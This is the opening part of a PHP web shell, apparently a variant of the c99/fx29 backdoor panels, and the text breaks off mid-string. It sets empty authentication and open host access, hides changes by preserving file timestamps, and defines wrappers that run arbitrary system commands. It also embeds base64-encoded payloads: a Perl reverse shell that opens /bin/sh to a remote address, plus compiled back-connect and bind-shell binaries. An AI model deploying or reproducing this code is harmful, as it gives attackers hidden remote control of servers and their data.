<?php

$sh_id = "Q3JlYXRlZCBCeSBEQU1BTkUyMDExIA0KRW1haWw6IGFiZG91MjAxMG5ld0Bob3RtYWlsLmZy";
$sh_ver = "";
$sh_name = base64_decode($sh_id).$sh_ver;
$sh_mainurl = "http://dz4all.com/cc/index.php";
$html_start = ''.
'<html><head>
<title>'.getenv("HTTP_HOST").' - '.$sh_name.'</title>
<link href="http://hdd-dz.com/xmlrpc/includes/favicon.ico" type="image/x-icon" rel="shortcut icon" />
<style type="text/css">
<!--
body,table { font-family:verdana;font-size:11px;color:white;background-color:black; }
table { width:100%; }
table,td { border:1px solid #808080;margin-top:2;margin-bottom:2;padding:5px; }
a { color:lightblue;text-decoration:none; }
a:active { color:#00FF00; }
a:link { color:#5B5BFF; }
a:hover { text-decoration:underline; }
a:visited { color:#99CCFF; }
input,select,option { font:8pt tahoma;color:#FFFFFF;margin:2;border:1px solid #666666; }
textarea { color:#dedbde;font:fixedsys bold;border:1px solid #666666;margin:2; }
.fleft { float:left;text-align:left; }
.fright { float:right;text-align:right; }
#pagebar { font:10pt tahoma;padding:5px; border:3px solid #1E1E1E; border-collapse:collapse; }
#pagebar td { vertical-align:top; }
#pagebar p { font:8pt tahoma;}
#pagebar a { font-weight:bold;color:#00FF00; }
#pagebar a:visited { color:#00CE00; }
#mainmenu { text-align:center; }
#mainmenu a { text-align: center;padding: 0px 5px 0px 5px; }
#maininfo,.barheader,.barheader2 { text-align:center; }
#maininfo td { padding:3px; }
.barheader { font-weight:bold;padding:5px; }
.barheader2 { padding:5px;border:2px solid #1F1F1F; }
.contents,.explorer { border-collapse:collapse;}
.contents td { vertical-align:top; }
.mainpanel { border-collapse:collapse;padding:5px; }
.barheader,.mainpanel table,td { border:1px solid #333333; }
.mainpanel input,select,option { border:1px solid #333333;margin:0; }
input[type="submit"] { border:1px solid #000000; }
input[type="text"] { padding:3px;}
.shell { background-color:#C0C0C0;color:#000080;padding:5px; }
.fxerrmsg { color:red; font-weight:bold; }
#pagebar,#pagebar p,h1,h2,h3,h4,form { margin:0; }
#pagebar,.mainpanel,input[type="submit"] { background-color:#4A4A4A; }
.barheader2,input,select,option,input[type="submit"]:hover { background-color:#333333; }
textarea,.mainpanel input,select,option { background-color:#000000; }
// -->
</style>
</head>
<body>
';
//Authentication
$login = ""; 
$pass = "";
$md5_pass = ""; //Password yg telah di enkripsi dg md5. Jika kosong, md5($pass).
$host_allow = array("*"); //Contoh: array("192.168.0.*","127.0.0.1")
$login_txt = "Restricted Area"; //Pesan HTTP-Auth
$accessdeniedmess = "<a href=\"$sh_mainurl\">".$sh_name."</a>: access denied";
$gzipencode = TRUE;
$updatenow = FALSE; //Jika TRUE, update shell sekarang.
$c99sh_updateurl = $sh_mainurl."fx29sh_update.php";
$c99sh_sourcesurl = $sh_mainurl."fx29sh_source.txt";
//$c99sh_updateurl = "http://localhost/toolz/fx29sh_update.php";
//$c99sh_sourcesurl = "http://localhost/toolz/fx29sh_source.txt";
$filestealth = TRUE; //TRUE, tidak merubah waktu modifikasi dan akses.
$curdir = "./";
$tmpdir = ""; 
$tmpdir_log = "./";
$log_email = "abdou2010new@hotmail.fr"; //email untuk pengiriman log.
$sort_default = "0a"; //Pengurutan, 0 - nomor kolom. "a"scending atau "d"escending
$sort_save = TRUE; //Jika TRUE, simpan posisi pengurutan menggunakan cookies.
$sess_cookie = "c99shvars"; //Nama variabel Cookie
$usefsbuff = TRUE; //Buffer-function
$copy_unset = FALSE; //Hapus file yg telah di-copy setelah dipaste
$hexdump_lines = 8;
$hexdump_rows = 24;
$win = strtolower(substr(PHP_OS,0,3)) == "win";
$disablefunc = @ini_get("disable_functions");
if (!empty($disablefunc)) {
  $disablefunc = str_replace(" ","",$disablefunc);
  $disablefunc = explode(",",$disablefunc);
}
//Functions
function get_phpini() {
  function U_wordwrap($str) {
    $str = @wordwrap(@htmlspecialchars($str), 100, '<wbr />', true);
    return @preg_replace('!(&[^;]*)<wbr />([^;]*;)!', '$1$2<wbr />', $str);
  }
  function U_value($value) {
    if ($value == '') return '<i>no value</i>';
    if (@is_bool($value)) return $value ? 'TRUE' : 'FALSE';
    if ($value === null) return 'NULL';
    if (@is_object($value)) $value = (array) $value;
    if (@is_array($value)) {
      @ob_start();
      print_r($value);
      $value = @ob_get_contents();
      @ob_end_clean();
    }
    return U_wordwrap((string) $value);
  }
  if (@function_exists('ini_get_all')) {
    $r = "";
    echo "<table><tr class=barheader><td>Directive</td><td>Local Value</td><td>Global Value</td></tr>";
    foreach (@ini_get_all() as $key=>$value) {
      $r .= "<tr><td>".$key."</td><td><div align=center>".U_value($value['local_value'])."</div></td><td><div align=center>".U_value($value['global_value'])."</div></td></tr>";
    }
    echo $r;
    echo "</table>";
  }
}
function disp_drives($curdir,$surl) {
  $letters = "";
  $v = explode("\\",$curdir);
  $v = $v[0];
  foreach (range("A","Z") as $letter) {
    $bool = $isdiskette = $letter == "A";
    if (!$bool) {$bool = is_dir($letter.":\\");}
    if ($bool) {
      $letters .= "<a href=\"".$surl."act=ls&d=".urlencode($letter.":\\")."\"".
      ($isdiskette?" onclick=\"return confirm('Make sure that the diskette is inserted properly, otherwise an error may occur.')\"":"")."> [";
      if ($letter.":" != $v) {$letters .= $letter;}
      else {$letters .= "<font color=yellow>".$letter."</font>";}
      $letters .= "]</a> ";
    }
  }
  if (!empty($letters)) {Return $letters;}
  else {Return "None";}
}
if (is_callable("disk_free_space")) {
  function disp_freespace($curdrv) {
    $free = disk_free_space($curdrv);
    $total = disk_total_space($curdrv);
    if ($free === FALSE) {$free = 0;}
    if ($total === FALSE) {$total = 0;}
    if ($free < 0) {$free = 0;}
    if ($total < 0) {$total = 0;}
    $used = $total-$free;
    $free_percent = round(100/($total/$free),2)."%";
    $free = view_size($free);
    $total = view_size($total);
    return "$free of $total ($free_percent)";
  }
}
//w4ck1ng Shell
if (!function_exists("myshellexec")) {
  if(is_callable("popen")) {
    function myshellexec($cmd) {
      if (!($p=popen("($cmd)2>&1","r"))) { return "popen Disabled!"; }
      while (!feof($p)) {
        $line=fgets($p,1024);
        $out .= $line;
      }
      pclose($p);
      return $out;
    }
  } else {
    function myshellexec($cmd) {
      global $disablefunc;
      $result = "";
      if (!empty($cmd)) {
        if (is_callable("exec") and !in_array("exec",$disablefunc)) {
          exec($cmd,$result);
          $result = join("\n",$result);
        } elseif (($result = $cmd) !== FALSE) {
        } elseif (is_callable("system") and !in_array("system",$disablefunc)) {
          $v = @ob_get_contents(); @ob_clean(); system($cmd); $result = @ob_get_contents(); @ob_clean(); echo $v;
        } elseif (is_callable("passthru") and !in_array("passthru",$disablefunc)) {
          $v = @ob_get_contents(); @ob_clean(); passthru($cmd); $result = @ob_get_contents(); @ob_clean(); echo $v;
        } elseif (is_resource($fp = popen($cmd,"r"))) {
          $result = "";
          while(!feof($fp)) { $result .= fread($fp,1024); }
          pclose($fp);
        }
      }
      return $result;
    }
  }
}
function ex($cfe) {
  $res = '';
  if (!empty($cfe)) {
    if(function_exists('exec')) {
      @exec($cfe,$res);
      $res = join("\n",$res);
    } elseif(function_exists('shell_exec')) {
      $res = @shell_exec($cfe);
    } elseif(function_exists('system')) {
      @ob_start();
      @system($cfe);
      $res = @ob_get_contents();
      @ob_end_clean();
    } elseif(function_exists('passthru')) {
      @ob_start();
      @passthru($cfe);
      $res = @ob_get_contents();
      @ob_end_clean();
    } elseif(@is_resource($f = @popen($cfe,"r"))) {
      $res = "";
      while(!@feof($f)) { $res .= @fread($f,1024); }
      @pclose($f);
    } else { $res = "Ex() Disabled!"; }
  }
  return $res;
}
function which($pr) {
  $path = ex("which $pr");
  if(!empty($path)) { return $path; } else { return $pr; }
}
//End of w4ck1ng Shell

//Backdoor
$back_connect_pl = "IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiOyc7DQokc3lzdGVtMT0gJ2VjaG8gImBpZGAiOyc7DQokc3lzdGVtMj0gJ2VjaG8gImBwd2RgIjsnOw0KJHN5c3RlbTM9ICdlY2hvICJgd2hvYW1pYEBgaG9zdG5hbWVgOn4gPiI7JzsNCiRzeXN0ZW00PSAnL2Jpbi9zaCc7DQokMD0kY21kOw0KJHRhcmdldD0kQVJHVlswXTsNCiRwb3J0PSRBUkdWWzFdOw0KJGlhZGRyPWluZXRfYXRvbigkdGFyZ2V0KSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQokcGFkZHI9c29ja2FkZHJfaW4oJHBvcnQsICRpYWRkcikgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHByb3RvPWdldHByb3RvYnluYW1lKCd0Y3AnKTsNCnNvY2tldChTT0NLRVQsIFBGX0lORVQsIFNPQ0tfU1RSRUFNLCAkcHJvdG8pIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCmNvbm5lY3QoU09DS0VULCAkcGFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCm9wZW4oU1RESU4sICI+JlNPQ0tFVCIpOw0Kb3BlbihTVERPVVQsICI+JlNPQ0tFVCIpOw0Kb3BlbihTVERFUlIsICI+JlNPQ0tFVCIpOw0KcHJpbnQgIlxuXG46OiB3NGNrMW5nLXNoZWxsIChQcml2YXRlIEJ1aWxkIHYwLjMpIHJldmVyc2Ugc2hlbGwgOjpcblxuIjsNCnByaW50ICJcblN5c3RlbSBJbmZvOiAiOyANCnN5c3RlbSgkc3lzdGVtKTsNCnByaW50ICJcbllvdXIgSUQ6ICI7IA0Kc3lzdGVtKCRzeXN0ZW0xKTsNCnByaW50ICJcbkN1cnJlbnQgRGlyZWN0b3J5OiAiOyANCnN5c3RlbSgkc3lzdGVtMik7DQpwcmludCAiXG4iOw0Kc3lzdGVtKCRzeXN0ZW0zKTsgc3lzdGVtKCRzeXN0ZW00KTsNCmNsb3NlKFNURElOKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==";
$back_connect_c = "f0VMRgEBAQAAAAAAAAAAAAIAAwABAAAA2IUECDQAAABMDAAAAAAAADQAIAAHACgAHAAZAAYAAAA0AAAANIAECDSABAjgAAAA4AAAAAUAAAAEAAAAAwAAABQBAAAUgQQIFIEECBMAAAATAAAABAAAAAEAAAABAAAAAAAAAACABAgAgAQILAkAACwJAAAFAAAAABAAAAEAAAAsCQAALJkECCyZBAg4AQAAPAEAAAYAAAAAEAAAAgAAAEAJAABAmQQIQJkECMgAAADIAAAABgAAAAQAAAAEAAAAKAEAACiBBAgogQQIIAAAACAAAAAEAAAABAAAAFHldGQAAAAAAAAAAAAAAAAAAAAAAAAAAAYAAAAEAAAAL2xpYi9sZC1saW51eC5zby4yAAAEAAAAEAAAAAEAAABHTlUAAAAAAAIAAAACAAAABQAAABEAAAAUAAAAAAAAAAAAAAARAAAAEgAAAAcAAAAKAAAACwAAAAgAAAAPAAAAAwAAAAAAAAAAAAAAAAAAABAAAAAAAAAAEwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFAAAABgAAAAAAAAABAAAAAAAAAAkAAAAAAAAADAAAAAAAAAAAAAAADQAAAA4AAAACAAAABAAAAAAAAAAAAAAAAAAAAAAAAAA2AAAAAAAAABwBAAASAAAArAAAAAAAAABxAAAAEgAAADwAAAAAAAAACwIAABIAAABIAAAAAAAAAH0AAAASAAAAjAAAAAAAAACsAQAAEgAAAKUAAAAAAAAArwAAABIAAABjAAAAAAAAACcAAAASAAAAkwAAAAAAAADdAAAAEgAAAEMAAAAAAAAAOgAAABIAAABcAAAAAAAAAKoBAAASAAAAVgAAAAAAAAA2AAAAEgAAAHMAAAAAAAAA2QAAABIAAAB4AAAAAAAAACgAAAASAAAAbQAAAAAAAAAOAAAAEgAAAC4AAAAAAAAAeAAAABIAAAB9AAAA8IgECAQAAAARAA4ATwAAAAAAAAA5AAAAEgAAAAEAAAAAAAAAAAAAACAAAAAVAAAAAAAAAAAAAAAgAAAAAF9Kdl9SZWdpc3RlckNsYXNzZXMAX19nbW9uX3N0YXJ0X18AbGliYy5zby42AGNvbm5lY3QAZXhlY2wAcGVycm9yAGR1cDIAc3lzdGVtAHNvY2tldABiemVybwBzdHJjYXQAaW5ldF9hZGRyAGh0b25zAGV4aXQAYXRvaQBfSU9fc3RkaW5fdXNlZABkYWVtb24AX19saWJjX3N0YXJ0X21haW4Ac3RybGVuAGNsb3NlAEdMSUJDXzIuMAAAAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAEAAgAAAAAAAQABACQAAAAQAAAAAAAAABBpaQ0AAAIAsgAAAAAAAAAImgQIBhMAABiaBAgHAQAAHJoECAcCAAAgmgQIBwMAACSaBAgHBAAAKJoECAcFAAAsmgQIBwYAADCaBAgHBwAANJoECAcIAAA4mgQIBwkAADyaBAgHCgAAQJoECAcLAABEmgQIBwwAAEiaBAgHDQAATJoECAcOAABQmgQIBw8AAFSaBAgHEQAAVYnlg+wI6EEBAADolAEAAOjnAwAAycMA/zUQmgQI/yUUmgQIAAAAAP8lGJoECGgAAAAA6eD/////JRyaBAhoCAAAAOnQ/////yUgmgQIaBAAAADpwP////8lJJoECGgYAAAA6bD/////JSiaBAhoIAAAAOmg/////yUsmgQIaCgAAADpkP////8lMJoECGgwAAAA6YD/////JTSaBAhoOAAAAOlw/////yU4mgQIaEAAAADpYP////8lPJoECGhIAAAA6VD/////JUCaBAhoUAAAAOlA/////yVEmgQIaFgAAADpMP////8lSJoECGhgAAAA6SD/////JUyaBAhoaAAAAOkQ/////yVQmgQIaHAAAADpAP////8lVJoECGh4AAAA6fD+//8x7V6J4YPk8FBUUmhoiAQIaBSIBAhRVmiAhgQI6E/////0kJBVieVT6AAAAABbgcMHFAAAUouD/P///4XAdAL/0FhbycOQkJBVieWD7AiAPWSaBAgAdA/rH412AIPABKNgmgQI/9KhYJoECIsQhdJ168YFZJoECAHJw4n2VYnlg+wIoTyZBAiFwHQZuAAAAACFwHQQg+wMaDyZBAj/0IPEEI12AMnDkJBVieVXVlOD7EyD5PC4AAAAAIPAD4PAD8HoBMHgBCnEjX2ovvSIBAj8uQcAAADzpI19r/y5DgAAALAA86qD7AhqAGoB6FD+//+DxBBmx0XIAgCD7AyLRQyDwAj/MOi3/v//g8QQD7fAg+wMUOi4/v//g8QQZolFyoPsDItFDIPABP8w6DH+//+D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EgAAAFwCAAAAAAAAKAAAABIAAABsAgAAZJoECAAAAAAQAPH/cwIAAAyaBAgAAAAAEQAVAIkCAABomgQIAAAAABAA8f+OAgAAAAAAAA4AAAASAAAAnwIAAAAAAAB4AAAAEgAAALICAAAsmQQIAAAAABAC8f/FAgAA8IgECAQAAAARAA4A1AIAAFiaBAgAAAAAEAAWAOECAAAAAAAAOQAAABIAAADzAgAAAAAAAAAAAAAgAAAABwMAACyZBAgAAAAAEALx/x0DAAAAAAAAAAAAACAAAAAAY2FsbF9nbW9uX3N0YXJ0AGNydHN0dWZmLmMAX19DVE9SX0xJU1RfXwBfX0RUT1JfTElTVF9fAF9fSkNSX0xJU1RfXwBwLjAAY29tcGxldGVkLjEAX19kb19nbG9iYWxfZHRvcnNfYXV4AGZyYW1lX2R1bW15AF9fQ1RPUl9FTkRfXwBfX0RUT1JfRU5EX18AX19GUkFNRV9FTkRfXwBfX0pDUl9FTkRfXwBfX2RvX2dsb2JhbF9jdG9yc19hdXgAYmFjay5jAGV4ZWNsQEBHTElCQ18yLjAAX0RZTkFNSUMAY2xvc2VAQEdMSUJDXzIuMABfZnBfaHcAcGVycm9yQEBHTElCQ18yLjAAX19maW5pX2FycmF5X2VuZABfX2Rzb19oYW5kbGUAX19saWJjX2NzdV9maW5pAHN5c3RlbUBAR0xJQkNfMi4wAF9pbml0AGRhZW1vbkBAR0xJQkNfMi4wAF9zdGFydABzdHJsZW5AQEdMSUJDXzIuMABfX2ZpbmlfYXJyYXlfc3RhcnQAX19saWJjX2NzdV9pbml0AGluZXRfYWRkckBAR0xJQkNfMi4wAF9fYnNzX3N0YXJ0AG1haW4AX19saWJjX3N0YXJ0X21haW5AQEdMSUJDXzIuMABfX2luaXRfYXJyYXlfZW5kAGR1cDJAQEdMSUJDXzIuMABzdHJjYXRAQEdMSUJDXzIuMABkYXRhX3N0YXJ0AF9maW5pAF9fcHJlaW5pdF9hcnJheV9lbmQAYnplcm9AQEdMSUJDXzIuMABleGl0QEBHTElCQ18yLjAAYXRvaUBAR0xJQkNfMi4wAF9lZGF0YQBfR0xPQkFMX09GRlNFVF9UQUJMRV8AX2VuZABodG9uc0BAR0xJQkNfMi4wAGNvbm5lY3RAQEdMSUJDXzIuMABfX2luaXRfYXJyYXlfc3RhcnQAX0lPX3N0ZGluX3VzZWQAX19kYXRhX3N0YXJ0AHNvY2tldEBAR0xJQkNfMi4wAF9Kdl9SZWdpc3RlckNsYXNzZXMAX19wcmVpbml0X2FycmF5X3N0YXJ0AF9fZ21vbl9zdGFydF9fAA==";
$backdoor = "f0VMRgEBAQAAAAAAAAAAAAIAAwABAAAAoIUECDQAAAD4EgAAAAAAADQAIAAHACgAIgAfAAYAAAA0AAAANIAECDSABAjgAAAA4AAAAAUAAAAEAAAAAwAAABQBAAAUgQQIFIEECBMAAAATAAAABAAAAAEAAAABAAAAAAAAAACABAgAgAQIrAkAAKwJAAAFAAAAABAAAAEAAACsCQAArJkECKyZBAg0AQAAOAEAAAYAAAAAEAAAAgAAAMAJAADAmQQIwJkECMgAAADIAAAABgAAAAQAAAAEAAAAKAEAACiBBAgogQQIIAAAACAAAAAEAAAABAAAAFHldGQAAAAAAAAAAAAAAAAAAAAAAAAAAAYAAAAEAAAAL2xpYi9sZC1saW51eC5zby4yAAAEAAAAEAAAAAEAAABHTlUAAAAAAAIAAAACAAAAAAAAABEAAAATAAAAAAAAAAAAAAAQAAAAEQAAAAAAAAAAAAAACQAAAAgAAAAFAAAAAwAAAA0AAAAAAAAAAAAAAA8AAAAKAAAAEgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYAAAABAAAAAAAAAAcAAAALAAAAAAAAAAQAAAAMAAAADgAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC4AAAAAAAAAdQEAABIAAACgAAAAAAAAAHEAAAASAAAANAAAAAAAAADMAAAAEgAAAGoAAAAAAAAAWgAAABIAAABMAAAAAAAAAHgAAAASAAAAYwAAAAAAAAA5AAAAEgAAAFgAAAAAAAAAOQAAABIAAACOAAAAAAAAAOYAAAASAAAAOwAAAAAAAAA6AAAAEgAAAFMAAAAAAAAAOQAAABIAAAB1AAAAAAAAALkAAAASAAAAegAAAAAAAAArAAAAEgAAAEcAAAAAAAAAeAAAABIAAABvAAAAAAAAAA4AAAASAAAAfwAAAEiJBAgEAAAAEQAOAEAAAAAAAAAAOQAAABIAAAABAAAAAAAAAAAAAAAgAAAAFQAAAAAAAAAAAAAAIAAAAABfSnZfUmVnaXN0ZXJDbGFzc2VzAF9fZ21vbl9zdGFydF9fAGxpYmMuc28uNgBleGVjbABwZXJyb3IAZHVwMgBzb2NrZXQAc2VuZABhY2NlcHQAYmluZABzZXRzb2Nrb3B0AGxpc3RlbgBmb3JrAGh0b25zAGV4aXQAYXRvaQBfSU9fc3RkaW5fdXNlZABfX2xpYmNfc3RhcnRfbWFpbgBjbG9zZQBHTElCQ18yLjAAAAACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAQACAAAAAAAAAAEAAQAkAAAAEAAAAAAAAAAQaWkNAAACAKYAAAAAAAAAiJoECAYSAACYmgQIBwEAAJyaBAgHAgAAoJoECAcDAACkmgQIBwQAAKiaBAgHBQAArJoECAcGAACwmgQIBwcAALSaBAgHCAAAuJoECAcJAAC8mgQIBwoAAMCaBAgHCwAAxJoECAcMAADImgQIBw0AAMyaBAgHDgAA0JoECAcQAABVieWD7AjoMQEAAOiDAQAA6FsEAADJwwD/NZCaBAj/JZSaBAgAAAAA/yWYmgQIaAAAAADp4P////8lnJoECGgIAAAA6dD/////JaCaBAhoEAAAAOnA/////yWkmgQIaBgAAADpsP////8lqJoECGggAAAA6aD/////JayaBAhoKAAAAOmQ/////yWwmgQIaDAAAADpgP////8ltJoECGg4AAAA6XD/////JbiaBAhoQAAAAOlg/////yW8mgQIaEgAAADpUP////8lwJoECGhQAAAA6UD/////JcSaBAhoWAAAAOkw/////yXImgQIaGAAAADpIP////8lzJoECGhoAAAA6RD/////JdCaBAhocAAAAOkA////Me1eieGD5PBQVFJorYgECGhciAQIUVZoQIYECOhf////9JCQVYnlU+gbAAAAgcO/FAAAg+wEi4P8////hcB0Av/Qg8QEW13Dixwkw1WJ5YPsCIA94JoECAB0DOscg8AEo9yaBAj/0qHcmgQIixCF0nXrxgXgmgQIAcnDVY